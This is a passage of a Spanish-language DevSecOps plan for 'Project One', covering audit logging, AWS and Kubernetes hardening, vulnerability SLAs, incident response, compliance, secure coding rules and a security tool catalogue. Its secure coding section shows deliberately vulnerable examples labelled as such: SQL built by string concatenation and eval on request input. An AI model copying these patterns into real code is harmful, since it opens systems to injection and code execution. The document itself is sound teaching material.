| Herramienta | Tipo | Integración Project One |
|-------------|------|-------------------------|
| **Splunk** | SIEM enterprise | Logs CloudTrail + app → HTTP Event Collector |
| **ELK Stack** | Open source | Filebeat → Logstash → Elasticsearch → Kibana |
| **Datadog** | SaaS observability | APM + ASM + Logs + Security monitoring |
| **Sumo Logic** | SaaS SIEM | Cloud-based, integración AWS nativa |

**Qué correlacionar**:
- Eventos de auth (login fallido, refresh rotation, MFA)
- Accesos admin y cambios de permisos
- Deploys y cambios de infraestructura
- Alertas de GuardDuty, WAF, Falco
- Anomalías de red (VPC Flow Logs)

### 17.4 Audit Logging (Estándar Enterprise)

| Qué loggear | Ejemplos | Retention |
|-------------|----------|-----------|
| **Authentication events** | login OK/fail, MFA, logout, token refresh | 180 días |
| **Authorization events** | acceso denegado, role change, permission grant | 365 días |
| **Admin actions** | creación/borrado usuarios, config changes | 365 días (regulatorio) |
| **Data access** | lectura/escritura de datos sensibles (PII) | 365 días |
| **System events** | deploys, restarts, config drift | 180 días |

```javascript
// apps/server/src/utils/auditLogger.js - Logging estructurado
const auditLogger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json(),
  ),
  defaultMeta: { service: 'project-one-api', type: 'audit' },
  transports: [new winston.transports.File({ filename: 'audit.log' })],
});

// Evento de auditoría
function logAuditEvent({ actor, action, target, outcome, ip, metadata = {} }) {
  auditLogger.info({
    audit: true,
    actor,           // user id
    action,          // 'user.role.change'
    target,          // { userId: 'u_123', role: 'admin' }
    outcome,         // 'success' | 'failure'
    ip,
    requestId,
    timestamp: new Date().toISOString(),
    ...metadata,
  });
}
```

> **Regla**: Nunca loggear secrets, tokens, passwords o PII sin enmascarar. El formato JSON estructurado permite SIEM parsing y correlación por `requestId`.

---

## 18. Cloud Security AWS

### 18.1 IAM (Identity and Access Management)

| Concepto | Descripción | Ejemplo |
|----------|-------------|---------|
| **Least Privilege** | Mínimos permisos necesarios por rol | ECS task role solo puede leer su bucket, no todos |
| **SCPs** (Service Control Policies) | Límites organizativos en Organization | Prohibir `iam:DeleteRole` a nivel cuenta |
| **Permission Boundaries** | Techo de permisos para roles delegados | Developer role max: read-only + dev services |
| **Access Analyzer** | Detecta políticas demasiado permisivas | Alertas "policy allows external access" |

```json
// ECS Task Role - Least Privilege (ejemplo)
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "secretsmanager:GetSecretValue",
        "kms:Decrypt"
      ],
      "Resource": [
        "arn:aws:secretsmanager:us-east-1:123456789012:secret:project-one/prod/*",
        "arn:aws:kms:us-east-1:123456789012:key/project-one-key"
      ]
    },
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject"],
      "Resource": ["arn:aws:s3:::project-one-assets/*"]
    }
  ]
}
```

### 18.2 Detective Controls (AWS)

| Servicio | Categoría | Qué detecta |
|----------|-----------|-------------|
| **GuardDuty** | Threat detection | Crypto-mining, credenciales comprometidas, comportamientos anómalos |
| **Security Hub** | Posture management | Agrega findings (GuardDuty, Inspector, Config), score CIS |
| **Inspector** | Vulnerability scan | CVEs en EC2/ECS/ECR, network reachability |
| **Macie** | Data classification | PII expuesta en S3 (emails, SSNs, tarjetas) |
| **Config** | Compliance drift | Recursos fuera de política (S3 público, SG abiertos) |
| **CloudTrail** | Audit trail | API calls, acceso admin, cambios de IAM |

### 18.3 Network Security

| Capa | Control | Configuración |
|------|---------|---------------|
| **VPC** | Segmentación | Public subnets (ALB, NAT), Private app (ECS), Private data (RDS/Redis) |
| **Security Groups** | Stateful firewall (instancia) | ECS: solo 80/443 desde ALB SG; RDS: solo 5432 desde ECS SG |
| **NACLs** | Stateless firewall (subnet) | Capa extra de denegación en subnets de datos |
| **VPC Flow Logs** | Registro de tráfico | Logs a CloudWatch/S3 → análisis SIEM |
| **Transit Gateway** | Peering centralizado | Conexión segura multi-VPC |

### 18.4 Edge Protection

| Servicio | Protección |
|----------|-----------|
| **AWS WAF** | Managed rules OWASP Top 10, rate-based rules, geo-blocking |
| **Shield Standard** | Incluido, protección DDoS L3/L4 |
| **Shield Advanced** | Protección DDoS avanzada, coste incluido WAF, DRT |
| **CloudFront** | CDN + TLS + integración WAF/Shield |

### 18.5 Data Protection

| Servicio | Control |
|----------|---------|
| **AWS KMS** | Envelope encryption, rotación automática de keys, HSM-backed |
| **S3** | SSE-S3/SSE-KMS, Object Lock (WORM), bucket policies restrictivas |
| **RDS** | Encryption at rest (KMS), IAM database auth, Secrets Manager integration |
| **Secrets Manager** | Rotación automática de credenciales DB |

**Cross-ref**: ver `../cicd-plan-implementacion.md` sección 9 (AWS + Floci para desarrollo local).

---

## 19. Container & Kubernetes Security

### 19.1 Imágenes Seguras (Distroless)

```dockerfile
# apps/server/Dockerfile.enterprise (referencia sección 6)
FROM gcr.io/distroless/nodejs20-debian12 AS runner
WORKDIR /app
ENV NODE_ENV=production
COPY --from=builder --chown=nodejs:nodejs /app/node_modules ./node_modules
COPY --from=builder --chown=nodejs:nodejs /app/dist ./dist
USER 65532:65532   # Non-root, non-login
EXPOSE 3000
CMD ["dist/index.js"]
```

**Beneficios distroless**: sin shell, sin package manager, sin compiladores — superficie de ataque mínima. Si el atacante logra RCE, no tiene shell para pivotar.

### 19.2 Hardening de Container

| Control | Descripción | Implementación |
|---------|-------------|----------------|
| **Read-only root FS** | El container no puede escribir en su propio filesystem | `readOnlyRootFilesystem: true` |
| **Non-root user** | Nunca ejecutar como root | `USER 65532` + `runAsNonRoot: true` |
| **Seccomp** | Filtrar syscalls | `seccompProfile: RuntimeDefault` |
| **AppArmor** | Perfil de acceso a archivos/procesos | `appArmorProfile` |
| **Drop capabilities** | Eliminar capabilities peligrosas | `drop: ["ALL"]` |
| **Resources** | Límites CPU/mem (anti DoS) | `limits: {cpu, memory}` |

```yaml
# k8s/security/pod-security-context.yaml
apiVersion: v1
kind: Pod
metadata:
  name: project-one-api
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 65532
    seccompProfile:
      type: RuntimeDefault
    appArmorProfile:
      type: RuntimeDefault
  containers:
    - name: api
      image: ghcr.io/myorg/project-one/server:latest
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
      resources:
        limits:
          cpu: "500m"
          memory: "512Mi"
```

### 19.3 Pod Security Standards (Admission)

| Estándar | Política | Uso |
|----------|----------|-----|
| **privileged** | Sin restricciones | Solo workloads críticos (nunca por defecto) |
| **baseline** | Previene escalada de privilegios conocida | Aplicaciones legacy |
| **restricted** | Hardening máximo | **Default para Project One** |

```yaml
# k8s/security/pod-security-admission.yaml
apiVersion: v1
kind: Namespace
metadata:
  name: project-one-prod
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/audit: restricted
```

### 19.4 Network Policies (Default Deny)

```yaml
# k8s/security/network-policy-default-deny.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: project-one-prod
spec:
  podSelector: {}   # Aplica a todos los pods
  policyTypes:
    - Ingress
    - Egress
---
# Permitir solo tráfico del API Gateway hacia la API
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-api-from-gateway
  namespace: project-one-prod
spec:
  podSelector:
    matchLabels:
      app: api
  policyTypes: [Ingress]
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: api-gateway
      ports:
        - protocol: TCP
          port: 3000
```

### 19.5 OPA Gatekeeper / Kyverno (Policy-as-Code)

**Kyverno** (nativo K8s, YAML puro) — requerir etiqueta de team en todos los recursos:

```yaml
# k8s/policies/require-team-label.yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-team-label
spec:
  validationFailureAction: Enforce
  rules:
    - name: check-for-team-label
      match:
        any:
          - resources:
              kinds:
                - Pod
      validate:
        message: "Todos los pods deben tener label 'team'"
        pattern:
          metadata:
            labels:
              team: "?*"
```

**OPA Gatekeeper** (rego) — prohibir imágenes `latest`:

```rego
# k8s/policies/block-latest-tag.rego
package k8sblocklatesttag

violation[{"msg": msg}] {
  image := input.review.object.spec.containers[_].image
  endswith(image, ":latest")
  msg := sprintf("Imagen con tag latest prohibida: %v", [image])
}
```

### 19.6 Sigstore policy-controller

Verificación de firmas de imágenes en admission (Kubernetes):

```yaml
# k8s/policies/verify-image-signature.yaml (ClusterImagePolicy)
apiVersion: policy.sigstore.dev/v1
kind: ClusterImagePolicy
metadata:
  name: image-policy
spec:
  images:
    - glob: "ghcr.io/myorg/project-one/*"
  authorities:
    - keyless:
        url: https://fulcio.sigstore.dev
        identities:
          - issuer: https://token.actions.githubusercontent.com
            subjectRegExp: "https://github.com/myorg/project-one/.*"
```

### 19.7 Service Mesh (mTLS Automático)

| Mesh | mTLS | Observabilidad | Notas |
|------|------|----------------|-------|
| **Istio** | ✅ Auto | ✅ Prometheus/Grafana/Kiali | Completo, mayor overhead |
| **Linkerd** | ✅ Auto | ✅ | Más ligero, Rust data plane |
| **Cilium** | ✅ (eBPF) | ✅ Hubble | CNI + mesh en uno |

> **Patrón enterprise**: mTLS automático entre services (identidad por workload, no por IP), zero-trust interno, sin exponer servicios al network externo.

---

## 20. Vulnerability Management

### 20.1 Priorización Inteligente: CVSS + EPSS + KEV

| Métrica | Qué mide | Escala | Uso |
|---------|----------|--------|-----|
| **CVSS v4** | Severidad inherente (Base + Threat + Environmental + Supplemental) | 0–10 | Línea base, pero no suficiente |
| **EPSS** | Probabilidad de explotación en los próximos 30 días (FIRST) | 0–1 | Prioriza por realidad de explotación |
| **KEV** (CISA) | Vulnerabilidades con explotación **activa confirmada** | Catálogo | Prioridad máxima absoluta |

**Fórmula de priorización**:
```
Prioridad = f(CVSS v4 severity, EPSS percentile, KEV presence, business exposure)

Reglas:
- CVE en KEV            → CRITICAL inmediato (fix en 7 días o menos)
- CVSS ≥ 9.0            → CRITICAL
- CVSS 7.0–8.9 + EPSS > 0.2 → HIGH (explotable pronto)
- CVSS 7.0–8.9 + EPSS ≤ 0.2 → HIGH (pero programable)
- CVSS 4.0–6.9          → MEDIUM
- CVSS < 4.0            → LOW
```

### 20.2 SLA por Severidad

| Severidad | SLA de Remediación | SLA de Mitigación | Ejemplo de Mitigación |
|-----------|--------------------|--------------------|------------------------|
| **CRITICAL** | 7 días | 24 horas | Workaround, WAF rule, deshabilitar feature, VEX not_affected |
| **HIGH** | 30 días | 7 días | Upgrade, config hardening |
| **MEDIUM** | 90 días | 30 días | Programado en sprint |
| **LOW** | 180 días | — | Backlog, monitoreo |

### 20.3 Workflow de Gestión

```
DETECT → TRIAGE → ASSIGN → REMEDIATE → VERIFY → CLOSE
   │        │         │          │          │         │
 Trivy    CVSS+    Security   Fix/      Re-scan    Registrar
 Snyk     EPSS+    team      upgrade   en CI      evidencia
 Dependa- KEV+     owner     VEX                 + auditoría
 bot      context
```

| Herramienta | Tipo | Rol |
|-------------|------|-----|
| **Snyk** | SCA + container + code | Scanning continuo, fix PRs automáticos |
| **Dependabot** | SCA (GitHub) | PRs de upgrade automáticos |
| **Trivy** | SCA + container + IaC | CI gates + registry scanning |
| **Grype** | SCA container | Scan imágenes local/registry |
| **Nessus** | Network/asset scanning | Infraestructura, posture |
| **OWASP Dependency-Check** | SCA (legacy) | Alternativa OSS |

### 20.4 Métricas del Programa

| Métrica | Meta |
|---------|------|
| MTTR vulnerabilidades | CRITICAL ≤ 7 días |
| Vulnerabilidades abiertas por severidad | CRITICAL/HIGH → 0 en prod |
| SLA compliance rate | ≥ 95% |
| Tiempo de detección (detect→fix) | < 24h para CRITICAL |
| % de dependencias con SBOM | 100% |

---

## 21. Incident Response (NIST SP 800-61 r2)

### 21.1 Ciclo de Vida (4 Fases)

```mermaid
graph LR
    A[1. Preparation\nEquipo, runbooks, tools] --> B[2. Detection & Analysis\nDetección, triage, análisis]
    B --> C[3. Containment\nEradication\nRecovery]
    C --> D[4. Post-Incident\nLessons learned, mejoras]
    D --> A
    style A fill:#a5f3fc,stroke:#0891b2
    style B fill:#fef08a,stroke:#ca8a04
    style C fill:#fecaca,stroke:#dc2626
    style D fill:#bbf7d0,stroke:#16a34a
```

| Fase | Actividades Clave | Entregable |
|------|--------------------|------------|
| **Preparation** | Equipo IR, runbooks, herramientas, capacitación | Runbooks, contactos, herramientas listas |
| **Detection & Analysis** | Detección (SIEM/Falco/GuardDuty), triage, análisis forense | Incident ticket, severity, scope |
| **Containment** | Aislar (network, IAM, credenciales), **Eradication** (eliminar root cause), **Recovery** (restaurar) | Containment plan, sistema limpio |
| **Post-Incident** | Postmortem blameless, acción correctiva, métricas | Postmortem, action items, mejoras |

### 21.2 Severity Levels

| Severity | Impacto | Ejemplos | Tiempo de Respuesta | Escalado |
|----------|---------|----------|---------------------|----------|
| **SEV-1** | Outage total, breach de datos, pago comprometido | RDS wiped, keys expuestas, producción caída | < 15 min | Inmediato, CTO + Security Lead |
| **SEV-2** | Degradación mayor, posible breach | API degradada, token leak potencial | < 1 hora | Security Lead |
| **SEV-3** | Menor, sin impacto cliente | Bug no crítico, alerta falsa | < 4 horas | On-call |
| **SEV-4** | Cosmético, backlog | Error tipográfico, log warning | 1–3 días | Backlog |

### 21.3 Runbooks Esenciales

| Runbook | Contenido |
|---------|-----------|
| **DDoS** | Detectar (Shield/WAF), escalar, rate limiting, geo-blocking, comunicar |
| **Data Breach** | Aislar sistema, revocar credenciales, evaluar alcance (PII), notificar (GDPR 72h), forense |
| **Credential/Secret Leak** | Detectar (Gitleaks/GitHub secret), rotar inmediato, revocar, auditar uso |
| **Ransomware** | Aislar, no pagar, forense, restaurar desde backups (PITR), notificar |
| **Supply Chain** (dependencia comprometida) | Identificar uso, evaluar impacto, pin/rollback versión, SBOM cross-check |

### 21.4 Postmortem Blameless (Template)

```markdown
# Postmortem: [Título del incidente]

## Resumen
- **Fecha**: 
- **Severity**: SEV-1/2/3/4
- **Duración**: 
- **Impacto**: (usuarios, datos, ingresos, cumplimiento)

## Timeline
| Tiempo | Evento |
|--------|--------|
| 14:02 | Detección (alerta Falco: shell en container) |
| 14:05 | Página on-call, SEV-2 |
| 14:30 | Containment (network policy isolate) |
| 15:10 | Eradication (revocar credenciales, kill proceso) |
| 15:45 | Recovery (redeploy imagen firmada) |
| 16:30 | Post-incident sync |

## Root Cause
[Análisis 5 Whys, sin culpar personas]

## Action Items
| # | Acción | Owner | Due Date | Estado |
|---|--------|-------|----------|--------|
| 1 | Añadir regla Falco para el vector | Sec | +7d | [ ] |

## Lessons Learned
- [Qué funcionó bien]
- [Qué falló]
- [Qué mejorar]
```

### 21.5 Tabletop Exercises

| Aspecto | Detalle |
|---------|---------|
| **Cadencia** | Trimestral (rotando escenarios) |
| **Escenarios** | Breach de datos, ransomware, supply chain, insider threat, DDoS |
| **Participantes** | Dev, Sec, Ops, Legal, Comms, Liderazgo |
| **Formato** | 60–90 min, inyectar eventos, evaluar decisiones |
| **Output** | Gaps en runbooks, decisiones de escalado, entrenamiento |

> **Compliance**: GDPR exige notificar breach a la autoridad en **72 horas** y a los afectados sin demora injustificada. Los runbooks deben incluir contactos legales y de reguladores.

---

## 22. Compliance y Auditoría

### 22.1 Tipos de Auditoría

| Tipo | Cadencia | Objetivo |
|------|----------|----------|
| **Interna** | Trimestral | Evaluar controles, preparar evidencia |
| **Externa** | Anual | Certificación (ISO 27001, SOC 2) o verificación |
| **Regulatoria** | Por evento | GDPR, PCI-DSS, HIPAA — según alcance |

### 22.2 Control Mapping (NIST ↔ ISO ↔ CIS ↔ SOC 2)

Reutiliza la matriz de la sección 3.1. Cada control del proyecto debe mapearse a su estándar:

```markdown
| Control | NIST CSF 2.0 | ISO 27001 | CIS v8 | SOC 2 |
|---------|--------------|-----------|--------|-------|
| Helmet CSP | PR.IP-1 | A.13.1 | 13.1 | CC6.7 |
| MFA (futuro) | PR.AC-1, PR.AC-7 | A.9.4.2 | 5.2 | CC6.1 |
```

### 22.3 Evidence Collection Automatizada

| Evidencia | Fuente Automatizada |
|-----------|---------------------|
| Audit log de auth | Logs app → S3 (immutable bucket) |
| API calls admin | AWS CloudTrail → CloudWatch → S3 |
| Config drift | AWS Config rules → Security Hub |
| Scans CI | SARIF reports → repositorio/artifact |
| Deploys | GH Actions audit + deployment events |
| SBOMs | Artifacts de release + registry |

```yaml
# S3 Bucket para evidencia - Object Lock (WORM)
resources:
  - type: aws_s3_bucket
    properties:
      bucket: project-one-compliance-evidence
      objectLockEnabled: true
      versioning:
        enabled: true
```

### 22.4 Continuous Compliance

| Herramienta | Uso |
|-------------|-----|
| **AWS Config Rules** | Validación continua de recursos vs políticas (S3 público, SG abiertos, MFA en root) |
| **Azure Policy / GCP Org Policy** | Análogos multi-cloud |
| **OPA / Kyverno** | Policy-as-Code en el pipeline y runtime |
| **Vanta / Drata / Secureframe** | Automatización de evidencia SOC 2/ISO, questionnaires |
| **AWS Audit Manager** | Evidence collection para frameworks de compliance |

### 22.5 Preparación de Auditoría

```
1. Gap assessment (vs framework objetivo)
2. Control owners asignados
3. Evidence readiness: buckets de evidencia automatizados
4. Walkthrough con auditores
5. Remediar gaps encontrados
6. Documentar resultados + gestión de riesgos residuales
```

---

## 23. Secure Coding Standards

### 23.1 Reglas Node.js/Express

| Regla | Por qué | Ejemplo |
|-------|---------|---------|
| **No `eval()` ni `Function()`** | RCE — ejecución de código arbitrario | Usar `JSON.parse` con try/catch, parsers específicos |
| **Queries parameterizadas (Prisma)** | Previene SQL injection | `prisma.user.findUnique({ where: { email } })` — nunca string concat |
| **Validación de input (Joi/Zod)** | Rechaza payloads malformados | `allowUnknown: false, stripUnknown: true` |
| **Safe JSON.parse** | Evita crash por malformed input | try/catch + `JSON.parse(req.body ?? '{}')` |
| **Error handling sin stack leaks** | Evita info disclosure | Global error handler, mensajes genéricos en prod |
| **No secrets hardcoded** | Previene exposure | `process.env.*` + secret manager |
| **Async error handling** | Evita unhandled rejections | async/await + try/catch o wrapper |

```javascript
// ❌ SQLi vulnerable
const users = await db.query(`SELECT * FROM users WHERE email = '${req.body.email}'`);

// ✅ Prisma parameterized
const users = await prisma.user.findMany({
  where: { email: req.body.email },  // Siempre parameterized
});

// ❌ RCE
const result = eval(req.body.expression);

// ✅ Seguro
const result = safeMathEvaluator(req.body.expression); // parser whitelist
```

### 23.2 Reglas React/Frontend

| Regla | Por qué | Ejemplo |
|-------|---------|---------|
| **No `dangerouslySetInnerHTML`** | XSS — inyección de HTML | Sanitizar con DOMPurify si es ineludible |
| **Escape de input de usuario** | XSS reflejado/almacenado | React escapa por defecto — no usar `{html}` |
| **CSP strict + report-only primero** | Mitiga XSS, robo de tokens | Helmet CSP con `report-uri` |
| **Refs estables (useCallback/useMemo)** | Evita re-renders y ataques de timing | `useCallback` para handlers, `useMemo` para valores |
| **No tokens en localStorage** | XSS los leería | Access token en memory (Redux), refresh en httpOnly cookie |
| **Sanitizar URLs de terceros** | Evita `javascript:` injection | Validar protocolo `https?` antes de usar |

### 23.3 Security Code Review Checklist

```markdown
## Security Review Checklist
- [ ] Autenticación: ¿tokens validados (issuer/audience/exp)? ¿MFA?
- [ ] Autorización: ¿RBAC/ownership check en CADA endpoint? ¿BOLA testeado?
- [ ] Input validation: ¿Joi/Zod en todos los bodies/params/query?
- [ ] Output encoding: ¿escapado correcto? ¿No dangerouslySetInnerHTML?
- [ ] Cryptografía: ¿algoritmos seguros? ¿claves en KMS? ¿HS256 solo dev?
- [ ] Secrets: ¿ninguno hardcodeado? ¿rotación?
- [ ] Logging: ¿sin secrets/PII? ¿JSON estructurado?
- [ ] Error handling: ¿sin stack traces en prod? ¿mensajes genéricos?
- [ ] Dependencias: ¿lockfile? ¿Trivy limpio? ¿sin deprecadas vulnerables?
- [ ] Config: ¿CORS estricto? ¿headers seguros (Helmet)? ¿CSP?
- [ ] Rate limiting: ¿endpoints sensibles limitados?
- [ ] Headers: ¿HSTS, X-Frame-Options, X-Content-Type-Options?
- [ ] IDOR/BOLA: ¿object IDs verificados contra el usuario autenticado?
- [ ] SSRF: ¿URLs de salida validadas y en allowlist?
- [ ] CSRF: ¿tokens en operaciones de estado?
```

### 23.4 OWASP ASVS (Application Security Verification Standard)

| Nivel | Uso | Verificación |
|-------|-----|--------------|
| **L1** | Todos los sistemas | Automated (SAST/DAST) — "oportunista" |
| **L2** | Sistemas con datos sensibles | L1 + manual review, threat modeling |
| **L3** | Sistemas críticos (financieros, salud) | L2 + diseño verificado, pen test, hardening |

Capítulos ASVS: V1 Arquitectura, V2 Autenticación, V3 Sesión, V4 Acceso, V5 Validación, V6 Storage, V7 Cripto, V8 Comunicación, V9 Errores/Logging, V10 Datos, V11 Malicioso, V12 Negocio, V13 Archivos, V14 API.

### 23.5 Certificaciones de Seguridad

| Cert | Enfoque | Nivel |
|------|---------|-------|
| **CISSP** | Gestión/arquitectura de seguridad | Avanzado |
| **OSCP** | Pentesting práctico (Kali) | Intermedio |
| **OSWE** | Web app exploitation | Avanzado |
| **OSCE3** | Exploit development | Experto |
| **CEH** | Ethical hacking | Intro |
| **GCIH** | Incident handling | Intermedio |
| **GWAPT** | Web app pentesting | Avanzado |
| **Security+** | Fundamentos | Intro |

---

## 24. Cultura DevSecOps

La tecnología sin cultura falla. DevSecOps es **compartir la responsabilidad de seguridad** entre todos los equipos.

### 24.1 Security Champions Program

| Aspecto | Detalle |
|---------|---------|
| **Rol** | 1 champion por equipo de desarrollo |
| **Responsabilidades** | Revisar PRs con foco security, escalar riesgos, difundir buenas prácticas |
| **Time allocation** | 10–20% del tiempo dedicado a seguridad |
| **Support** | Training mensual, acceso a tools, línea directa con Security team |
| **Incentivos** | Reconocimiento, presupuesto de certificación |

### 24.2 Security Guild

- **Cross-team**: champions + security engineers + SREs
- **Sync mensual**: compartir hallazgos, nuevas tools, threat intel
- **Knowledge sharing**: ADRs de seguridad, playbooks, template reutilizables
- **Output**: mejoras al secure coding standard, reglas Semgrep custom, runbooks

### 24.3 OKRs de Seguridad (Ejemplo Trimestral)

```markdown
## Objetivo 1: Reducir tiempo de remediación de vulnerabilidades
- KR1: MTTR CRITICAL ≤ 7 días (baseline: 21 días)
- KR2: 100% de vulns HIGH en prod resueltas en 30 días
- KR3: Automatizar fix PRs (Dependabot + Snyk) en 100% de repos

## Objetivo 2: Integrar seguridad en el pipeline
- KR1: 100% de pipelines con Trivy + CodeQL + Gitleaks
- KR2: 100% de imágenes firmadas con cosign
- KR3: SBOM generado en 100% de releases

## Objetivo 3: Cultura y capacitación
- KR1: 100% de developers completaron SecureFlag/Snyk Learn
- KR2: 1 threat modeling workshop por trimestre
- KR3: 2 tabletop exercises anuales
```

### 24.4 Training y Gamificación

| Formato | Herramientas | Cadencia |
|---------|--------------|----------|
| **Secure code training** | SecureFlag, Snyk Learn, Kontra | Onboarding + trimestral |
| **CTF** | HackTheBox, TryHackMe, PicoCTF | Mensual (interno) |
| **Bug bounty interno** | Programa interno con puntos | Continuo |
| **OWASP Top 10 workshops** | Interno | Trimestral |
| **Threat modeling practicum** | STRIDE/PASTA sobre features reales | Trimestral |

### 24.5 Threat Modeling Cadencia

| Cuándo | Qué | Output |
|--------|-----|--------|
| **Cada feature mayor** | STRIDE en design phase (OpenSpec `design.md`) | Threat list + mitigaciones |
| **Cambio arquitectónico** | PASTA completo | Risk report |
| **Trimestral** | Revisión de threat models existentes | Actualizaciones |
| **Post-incidente** | Re-threat model del vector explotado | Reglas Falco/Semgrep nuevas |

**Cross-ref**: integración con OpenSpec en sección 5.3 y `../cicd-plan-implementacion.md` Sprint 4.

---

## 25. Roadmap de Madurez de Seguridad (Niveles 1–5)

### 25.1 Niveles de Madurez

| Nivel | Nombre | Características |
|-------|--------|-----------------|
| **1** | **REACTIVE** | Firefighting, sin procesos, sin ownership, herramientas ad-hoc |
| **2** | **MANAGED** | Controles básicos, monitoreo, repeatable, tools integradas |
| **3** | **DEFINED** | Procesos documentados, estandarizados, organizacionales |
| **4** | **MEASURED** | Métricas/KPIs, mejora continua, gate por datos |
| **5** | **OPTIMIZING** | Proactivo, ML-driven, self-healing, alineado a negocio |

### 25.2 Matriz de Madurez por Área (Project One)

| Área | Nivel Actual | Target (12m) | Gaps a Cerrar |
|------|-------------|--------------|---------------|
| **Governance** | 2 | 3 | Políticas documentadas, control owners, cadencia auditoría |
| **Threat Modeling** | 1 | 3 | STRIDE/PASTA en design phase OpenSpec (gap `security-design.md` A04) |
| **SAST** | 3 | 4 | Semgrep+CodeQL en CI ✅; añadir métricas de coverage y drift |
| **SCA** | 1 | 3 | **Sin Dependabot** (gap `cicd-estado-actual.md`), sin SBOM, Trivy manual |
| **Secret Management** | 2 | 4 | Gitleaks ✅; añadir rotation automática, Vault/Secrets Manager |
| **CI/CD Security** | 1 | 3 | **Sin CD**, sin cosign, sin SLSA, sin .dockerignore (gaps CI/CD doc) |
| **Incident Response** | 1 | 3 | Runbooks, equipo IR, tabletop, SIEM |
| **Compliance** | 1 | 2 | Control mapping, evidence automation, auditoría interna |
| **Runtime Security** | 1 | 3 | Falco/eBPF, RASP, SIEM integration |

### 25.3 Diagrama Roadmap

```mermaid
flowchart LR
    subgraph L1["NIVEL 1 · REACTIVE"]
        A1[Firefighting]
        A2[Sin procesos]
        A3[Tools ad-hoc]
    end
    subgraph L2["NIVEL 2 · MANAGED"]
        B1[Controles básicos]
        B2[Monitoreo]
        B3[SAST/SCA en CI]
        B4[Secret scanning]
    end
    subgraph L3["NIVEL 3 · DEFINED"]
        C1[Procesos documentados]
        C2[Threat modeling formal]
        C3[SBOM + Dependabot]
        C4[CD seguro + OIDC]
    end
    subgraph L4["NIVEL 4 · MEASURED"]
        D1[Métricas DORA + security]
        D2[SLSA L3 + cosign]
        D3[SIEM + Falco]
        D4[SLA compliance 95%+]
    end
    subgraph L5["NIVEL 5 · OPTIMIZING"]
        E1[ML-driven detection]
        E2[Self-healing]
        E3[Zero Trust completo]
        E4[Continuous compliance]
    end

    L1 --> L2 --> L3 --> L4 --> L5

    style L1 fill:#fecaca,stroke:#dc2626
    style L2 fill:#ffedd5,stroke:#ea580c
    style L3 fill:#fef08a,stroke:#ca8a04
    style L4 fill:#bbf7d0,stroke:#16a34a
    style L5 fill:#a5f3fc,stroke:#0891b2
```

### 25.4 Gap Analysis (desde `../cicd-estado-actual.md`)

| Gap Identificado | Acción | Nivel Destino |
|------------------|--------|---------------|
| Sin tests en CI | Añadir unit/integration/e2e jobs (sección 16.10) | L3 |
| Sin build en CI | Añadir build job + Docker multistage | L3 |
| Sin `.dockerignore` | Crear para reducir contexto/imagen | L3 |
| Sin Dependabot | Añadir `dependabot.yml` (sección 16.4) | L3 |
| Sin SBOM | Añadir `anchore/sbom-action` (sección 16.8) | L3 |
| Sin CD | Implementar CD con environments + gates (sección 16.10) | L3 |
| Sin firmas de imagen | cosign keyless + SLSA provenance | L4 |
| Sin OIDC (access keys en secrets) | Migrar a OIDC federation | L4 |

### 25.5 Plan de Acción 12 Meses

| Trimestre | Foco | Entregables |
|-----------|------|-------------|
| **Q1** | CI hardening | Tests+build en CI, .dockerignore, Dependabot, Trivy gates |
| **Q2** | CD seguro | OIDC AWS, environments, deploy staging, SBOM |
| **Q3** | Supply chain | cosign sign, SLSA L2, policy-controller, VEX |
| **Q4** | Runtime + ops | Falco, SIEM, runbooks IR, tabletop, metrics |

---

## 26. Catálogo de Herramientas

### 26.1 SAST (Static Application Security Testing)

| Herramienta | Open Source / Commercial | Para qué | CI/CD | Link |
|-------------|--------------------------|----------|-------|------|
| **CodeQL** | Freemium (GitHub) | SAST profundo, code query language | ✅ GitHub-native | https://codeql.github.com/ |
| **Semgrep** | OSS + Commercial | SAST rápido, reglas custom, pre-commit | ✅ | https://semgrep.dev/ |
| **SonarQube** | OSS (Community) + Commercial | SAST + code quality + coverage | ✅ | https://www.sonarsource.com/ |
| **Snyk Code** | Commercial | SAST + SCA integrados | ✅ | https://snyk.io/ |

### 26.2 DAST (Dynamic Application Security Testing)

| Herramienta | OS/Commercial | Para qué | CI/CD | Link |
|-------------|--------------|----------|-------|------|
| **OWASP ZAP** | OSS | DAST automatizado, proxy, active scan | ✅ | https://www.zaproxy.org/ |
| **Burp Suite** | Commercial (+Community) | Pentesting manual + automated | ⚠️ | https://portswigger.net/burp |
| **Nuclei** | OSS | Template-based vulnerability scanner | ✅ | https://github.com/projectdiscovery/nuclei |
| **Nikto** | OSS | Web server scanner | ✅ | https://github.com/sullo/nikto |

### 26.3 IAST (Interactive AST)

| Herramienta | OS/Commercial | Para qué | CI/CD | Link |
|-------------|--------------|----------|-------|------|
| **Contrast Security** | Commercial | IAST con agentes en runtime | ✅ | https://www.contrastsecurity.com/ |
| **Datadog ASM** | Commercial | RASP + ASM en runtime | ✅ | https://www.datadoghq.com/ |

### 26.4 SCA (Software Composition Analysis)

| Herramienta | OS/Commercial | Para qué | CI/CD | Link |
|-------------|--------------|----------|-------|------|
| **Trivy** | OSS (Aqua) | SCA + container + IaC scanner | ✅ | https://trivy.dev/ |
| **Snyk** | Freemium + Commercial | SCA + fix PRs + container | ✅ | https://snyk.io/ |
| **Dependabot** | Gratis (GitHub) | PRs de upgrade automáticos | ✅ | https://github.com/dependabot |
| **Renovate** | OSS + Commercial | Dependency updates avanzadas | ✅ | https://www.mend.io/renovate/ |
| **OSV-Scanner** | OSS (Google) | Vulnerabilidades vía OSV.dev | ✅ | https://google.github.io/osv-scanner/ |

### 26.5 Secret Scanning

| Herramienta | OS/Commercial | Para qué | CI/CD | Link |
|-------------|--------------|----------|-------|------|
| **Gitleaks** | OSS | Secret scanning en repo/git history | ✅ | https://github.com/gitleaks/gitleaks |
